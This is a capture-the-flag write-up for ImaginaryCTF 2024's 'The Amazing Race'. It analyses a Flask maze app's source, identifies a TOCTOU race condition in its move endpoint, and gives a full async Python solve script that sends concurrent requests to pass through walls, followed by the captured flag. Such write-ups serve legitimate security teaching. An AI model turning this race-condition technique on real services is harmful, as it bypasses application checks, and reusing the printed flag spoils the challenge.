# The Amazing Race

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 100 solves / 100 points
- Author: @puzzler7
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

I've hidden my flag in an impenetrable maze! Try as you might, even though it's right there, you'll never get the flag!

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722151712.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722151744.png)

When we go to `/`, it redirects us to `/<UUIDv4>`.

In here, we can play a maze game by clicking those "Up", "Down", "Left", and "Right" button.

Let's click the "Right" button!

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722151923.png)

When we click one of those buttons, it'll send a POST request to `/move` with GET parameter `id=<UUIDv4>` and `move=<direction>`.

After playing with this game, we can learn that `.` is a walkable path, `@` is our player current position, `#` is the walls, and **`F` is the goal**.

**If we take a closer look at the last 3 rows, we can see that the `F` is unreachable:**
```
#.#.###.#...#..###.##...#..#...#..#
....#.#..###..#.....#.#..#..##..#.#
#.#....#....#.#.##.#...#.#.#...#.#F
```

As you see, the `F` is surrounded by 2 `#` walls, making it unreachable.

Hmm... Just like the challenge's description, it says "I've hidden my flag in an impenetrable maze!". Well, let's see how "impenetrable" it is!

In this page, we can also view the source code of this web application via the "source" link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722152441.png)

**Let's [download it](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/The-Amazing-Race/app.py) and take a look at it!**
```
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race)-[2024.07.22|15:25:19(HKT)]
└> curl http://the-amazing-race.chal.imaginaryctf.org/source -o app.py
[...]
```

After reading the source code a little bit, we found that this web application is written in Python, with web application frame "[Flask](https://flask.palletsprojects.com/en/3.0.x/)".

**In addition, it has 2 routes that serve static files [`maze.py`](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/The-Amazing-Race/maze.py) and [`Dockerfile`](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/The-Amazing-Race/Dockerfile):**
```python
from flask import Flask, redirect, render_template, Response, request
[...]
app = Flask(__name__)
[...]
@app.route("/maze")
def mazeSource():
    return Response(open("maze.py"), mimetype="text/plain")

@app.route("/docker")
def docker():
    return Response(open("Dockerfile"), mimetype="text/plain")
```

We can also download those 2 files!

```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race)-[2024.07.22|15:25:38(HKT)]
└> curl http://the-amazing-race.chal.imaginaryctf.org/maze -o maze.py        
[...]
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race)-[2024.07.22|15:28:27(HKT)]
└> curl http://the-amazing-race.chal.imaginaryctf.org/docker -o Dockerfile 
[...]
```

Now we have all the necessary files that we need!

First off, where's the flag?

In route `/<mazeId>`, **when the maze is solved** (`solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1)`), it'll render the flag file's content in the `maze.html` template:
```python
MAZE_SIZE = 35
[...]
@app.route("/", defaults={"mazeId": None})
@app.route("/<mazeId>")
def index(mazeId):
    [...]
    solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1)
    return render_template("maze.html", 
        maze=getMaze(mazeId), 
        mazeId=mazeId,
        flag=open("flag.txt").read() if solved else ""
    )
```

Hmm... How the web application determine the maze is solved? If we take a look at the `getLoc` function, it queries the SQLite database's table `mazes` to get the current maze's `row` and `col`, which are our player's current position:

```python
from sqlite3 import *
[...]
def getLoc(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT row, col FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret
```

So, if our player's current position is at row 34, column 34 (The position of `F`), the web application will determine the maze is solved.

We can also see the structure of table `mazes`:

```python
def initDb():
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS mazes(
            id TEXT PRIMARY KEY, 
            maze TEXT NOT NULL,
            row INTEGER NOT NULL DEFAULT 0,
            col INTEGER NOT NULL DEFAULT 0,
            up BOOL NOT NULL DEFAULT False,
            down BOOL NOT NULL DEFAULT True,
            left BOOL NOT NULL DEFAULT False,
            right BOOL NOT NULL DEFAULT True
            )
    ''')
    con.commit()
    cur.close()
    con.close()
[...]
initDb()
```

When this Python script is executed, it'll create table `mazes`, with column `id`, `maze`, `row`, `col`, `up`, `down`, `left`, and `right`.

For column `up`, `down`, `left`, and `right`, their data type is boolean, and it's used to restrict which redirection the player can move to.

Now, we can read route `/move`'s logic and see what can we take advantage of.

First, it takes 2 parameters, `id` and `move`. Then, **it fetches the direction that the player can move from the database**, and use the fetched records to get the valid moves:

```python
def getCanMove(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT up, down, left, right FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret
[...]
@app.route("/move", methods=["POST"])
def move():
    mazeId = request.args["id"]
    moveStr = request.args["move"]

    canMove = getCanMove(mazeId)
    validMoves = ["up", "down", "left", "right"]
    moveIdx = None
    if moveStr in validMoves:
        moveIdx = validMoves.index(moveStr)
    validMovesDict = {"up": (-1, 0), "down": (1, 0), "left": (0, -1), "right": (0, 1)}
    move = validMovesDict.get(moveStr, None)
    if not move or moveIdx is None or not canMove[moveIdx]:
        return redirect(f"/{mazeId}")
    [...]
```

For instance, if the `move` parameter's value is `down`, it'll fetch the column `up`, `down`, `left`, and `right` record from the database. If record `down` is `True`, it'll continue its execution, because `True` means we're allow to move to that direction.

After that, it'll fetch our player's current position from the database, and set our new position to `currentLoc[row] + move[row]` and `currentLoc[column] + move[column]`, where the `move`'s values are defined in `validMovesDict`.

```python
def writeLoc(mazeId, loc):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET row = ?, col = ? WHERE id = ?
    ''', (*loc, mazeId))
    con.commit()
    cur.close()
    con.close()
[...]
def bound(n, mn=0, mx=MAZE_SIZE):
    return max(min(n, mx), mn)
[...]
@app.route("/move", methods=["POST"])
def move():
    [...]
    currentLoc = getLoc(mazeId)
    newLoc = [bound(currentLoc[0] + move[0]), bound(currentLoc[1] + move[1])]
    writeLoc(mazeId, newLoc)
```

After setting the player's new position, it'll get the current maze from the database and update it to a new one, which set the old player position with `.` and the new position with `@`:

```python
def getMaze(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT maze FROM mazes WHERE id = ?", (mazeId,)).fetchone()[0]
    cur.close()
    con.close()
    return ret
[...]
def writeMaze(mazeId, maze):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET maze = ? WHERE id = ?
    ''', (maze, mazeId))
    con.commit()
    cur.close()
    con.close()
[...]
@app.route("/move", methods=["POST"])
def move():
    mazeStr = getMaze(mazeId)
    maze = [[c for c in row] for row in mazeStr.splitlines()]
    maze[currentLoc[0]][currentLoc[1]] = '.'
    maze[newLoc[0]][newLoc[1]] = '@'
    writeMaze(mazeId, '\n'.join(''.join(row) for row in maze))
```

Finally, after updating the new maze, **it'll update our restricted move direction to a new one**:

```python
def writeCanMove(mazeId, canMove):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET up = ?, down = ?, left = ?, right = ? WHERE id = ?
    ''', (*canMove, mazeId))
    con.commit()
    cur.close()
    con.close()
[...]
def inn(n, mn = 0, mx = MAZE_SIZE):
    return mn <= n < mx 
[...]
@app.route("/move", methods=["POST"])
def move():
    [...]
    newCanMove = []
    for dr, dc in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
        checkLoc = [newLoc[0] + dr, newLoc[1] + dc]
        newCanMove.append(
            inn(checkLoc[0]) and inn(checkLoc[1])
            and maze[checkLoc[0]][checkLoc[1]] != '#'
        )
    writeCanMove(mazeId, newCanMove)

    return redirect(f"/{mazeId}")
```

In the `newCanMove.append()`, it checks the new player position's surrounding whether has a wall or not. If doesn't have a wall, it mark that position as walkable:

```
#.#
.@.
###
 ^
 |
 +-> not walkable
```

Hmm... Can we somehow **bypass the moving direction's restriction**?

Based on this challenge's title and the logic of restricting player's moving direction, it's vulnerable to **race condition**. More specially, it's **limit overrun race condition (aka TOCTOU)**.

Consider the following maze where we can only move `left` or `right`:

```
#######
#.@#..#
#######
```

It is possible to **force the player to move to the `right` side despite there's a wall**? The answer is yes.

To do so, we can:

1. **Player moves to `left`**, so **the restricted direction will be `right`** instead of `left`
> ```
> #######
> #@.#..#
> #######
> ```
2. Now **send 2 move `right` requests at the same time**
3. The player's position will be at the center wall
> ```
> #######
> #..@..#
> #######
> ```

This is because in step 2, the data fetched from the database are `left`. Since the restricted directions are `left`, the application will happily allow the player to move to `right` direction twice, thus wining the race condition.

## Exploitation

Based on the above information, we can write a solve script to get the flag!

```python
#!/usr/bin/env python3
import requests
import aiohttp
import asyncio
import os
import re
from bs4 import BeautifulSoup

class Solver:
    MOVE_STEPS = 2

    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.MOVE_PLAYER_ENDPOINT = '/move'
        self.MAZE_SIZE = 35
        self.FLAG_FORMAT = re.compile('(ictf\{.*?\})')

    async def createNewMaze(self):
        mazeId = requests.get(self.baseUrl, allow_redirects=False).headers.get('Location').strip('/')
        return mazeId

    async def getMaze(self, mazeId):
        url = f'{self.baseUrl}/{mazeId}'
        responseText = requests.get(url).text
        maze = BeautifulSoup(responseText, 'html.parser').find('code').text.strip()
        maze2DList = [list(row) for row in maze.split('\n') if row]

        os.system('clear')
        print(f'[*] Maze ID: {mazeId} | Current maze:\n{maze}')
        return maze2DList

    async def moveToDirection(self, mazeId, direction):
        url = f'{self.baseUrl}{self.MOVE_PLAYER_ENDPOINT}'
        parameters = {
            'id': mazeId,
            'move': direction
        }

        requests.post(url, params=parameters)

        await self.getMaze(mazeId) # update console output

    async def asyncMoveToDirection(self, mazeId, direction):
        url = f'{self.baseUrl}{self.MOVE_PLAYER_ENDPOINT}?id={mazeId}&move={direction}'
        async with aiohttp.ClientSession() as session:
            async with session.post(url) as response:
                # the response is useless for us, so we'll just discard the response
                response.release()

    async def sendRaceConditionRequests(self, mazeId, direction, moveSteps=MOVE_STEPS):
        tasks = []
        for _ in range(moveSteps):
            task = asyncio.ensure_future(self.asyncMoveToDirection(mazeId, direction))
            tasks.append(task)

        await asyncio.gather(*tasks)

    async def getMazePlayerPosition(self, maze):
        playerPositions = list()
        for i in range(len(maze)):
            for j in range(len(maze[i])):
                if maze[i][j] == '@':
                    playerPositions.append((i, j))

        if len(playerPositions) == 1:
            return playerPositions[0]

        # sometimes the web app will write our player `@` in multiple places, 
        # so we'll only find the player who reaches the furthest
        return playerPositions[-1]

    async def performMazeAction(self, futureSteps, mazeId, direction, playerRow=0, playerColumn=0):
        # we don't want the player goes outside of the maze
        optimalMoveSteps = self.MOVE_STEPS
        if direction == 'right':
            optimalMoveSteps = self.MAZE_SIZE - playerRow + 1
            oppositeDirection = 'left'
        elif direction == 'down':
            optimalMoveSteps = self.MAZE_SIZE - playerColumn + 1
            oppositeDirection = 'up'

        # a wall is in front of us. Move to the opposite direction, 
        # then send 2 requests to the intended direction
        if '#' in futureSteps[-1]:
            await self.moveToDirection(mazeId, oppositeDirection)
            await self.sendRaceConditionRequests(mazeId, direction, moveSteps=optimalMoveSteps)
        elif '.' in futureSteps[-1] or 'F' in futureSteps[-1]:
            await self.moveToDirection(mazeId, direction)

    async def exploreMazeNeighbors(self, maze, direction, mazeId, playerRow=0, playerColumn=0):
        futureSteps = list()
        match direction:
            case 'right':
                futureSteps = maze[playerRow:playerRow + Solver.MOVE_STEPS]
                await self.performMazeAction(futureSteps, mazeId, direction, playerRow)
            case 'down':
                futureSteps = maze[playerColumn:playerColumn + Solver.MOVE_STEPS]
                await self.performMazeAction(futureSteps, mazeId, direction, playerColumn)

    async def getFlag(self, mazeId):
        url = f'{self.baseUrl}/{mazeId}'

        responseText = requests.get(url).text
        match = re.search(self.FLAG_FORMAT, responseText)
        if match is not None:
            flag = match.group(0)
            return flag
        
    async def solveMaze(self, mazeId):
        isSolved = False
        while not isSolved:
            maze = await self.getMaze(mazeId)

            playerColumn, playerRow = await self.getMazePlayerPosition(maze)
            isPlayerReachedTheGoal = True if playerRow == self.MAZE_SIZE - 1 and playerColumn == self.MAZE_SIZE - 1 else False
            if isPlayerReachedTheGoal:
                isSolved = True

            # we want to start from top left to top right, then continue from top right to bottom right
            isPlayerReachedAtTopRight = True if playerRow == self.MAZE_SIZE - 1 else False
            if not isPlayerReachedAtTopRight:
                mazeFirstRow = maze[0]
                direction = 'right'
                await self.exploreMazeNeighbors(mazeFirstRow, direction, mazeId, playerRow=playerRow)
            else:
                mazeLastColumns = list()
                for mazeRow in maze:
                    mazeLastColumns.append(mazeRow[-1])

                direction = 'down'
                await self.exploreMazeNeighbors(mazeLastColumns, direction, mazeId, playerColumn=playerColumn)

        return await self.getFlag(mazeId)

    async def solve(self):
        mazeId = await self.createNewMaze()
        flag = await self.solveMaze(mazeId)
        if flag:
            print(f'[+] We got the flag!\n{flag}')

async def main():
    baseUrl = 'http://localhost'
    # baseUrl = 'http://the-amazing-race.chal.imaginaryctf.org'
    solver = Solver(baseUrl)

    await solver.solve()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
```

> Note: This solve script is far from perfect!

```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race)-[2024.07.23|12:55:56(HKT)]
└> python3 solve.py
[*] Maze ID: 472d2492-37c8-4ae3-b490-e46a902eb567 | Current maze:
............@.......@##............
.#.#.#.........#.#....#...##....##.
#......#.##.##....#.#...#....#.#...
.#.#.#..#.....#.#..###.##.##.##.##.
.#.##..##.#.#..##.#.##...##.......@
.....#...#...##.......####.##.#.#..
#.#.####..#.##.##.#.#......#.#.#.#.
#.#..#..#.#......####.#.#.#........
...#...#.#.####.#.#..#..##..##.#.#.
.#.#.#........#....#.#.#..#..#.#...
..#.#..##.#.#..#.#....#..#..#.#.##.
.#..##..#.#..#.###.#.#.#.##........
...#.#.#...##.#...#.........#.##.#.
.#....#..#......#..#.##.#.#..#....@
#..##..#..##.##..##..#.#.#..#.#.#.#
.#..#.###..#...#...#...#..#....##..
...#.#.#..##.##.##.#.#...#..##.#.#@
.#...#..##......#.#...#.#..#.......
#..#...#..#.#.#...#.#..#..#.##.##..
##..#.##.##.#.#.#.#..#.#.#....##...
#..#.......#..#.#..#..#.#..#.#..#..
..#.#.##.#..##...#..#...##.##.#.#..
#.#.##..#.##..#.#..#.##..........#.
.......#....#....#.#...###.#.###...
.#.#.#...#.#..#.##...##...#....#.#.
.#..#..#..#.##....#.#...#..#.#..#..
#.#..#..#....#.#.#....#..#.#..#....
....#..###.####...#.#.#.#.##.##.##.
#.##..#.##...#.#.#..#..#....#...#..
....#.....###...###.#.#.#.##.#.#.#.
.#.#..#.#.....#..#.#..........#..#.
.#.##.#..##.#.#.#..#.#.#.##.#...#..
..#....#...#.#....#..#.#...###.#.#.
#..#.#..##....#.#..#.#..#.###......
##.#.#.#...#.#...#..#..#...#..#.##@
[+] We got the flag!
ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}
```

We got the flag!

- **Flag: `ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}`**

## Conclusion

What we've learned:

1. Limit overrun race condition (TOCTOU)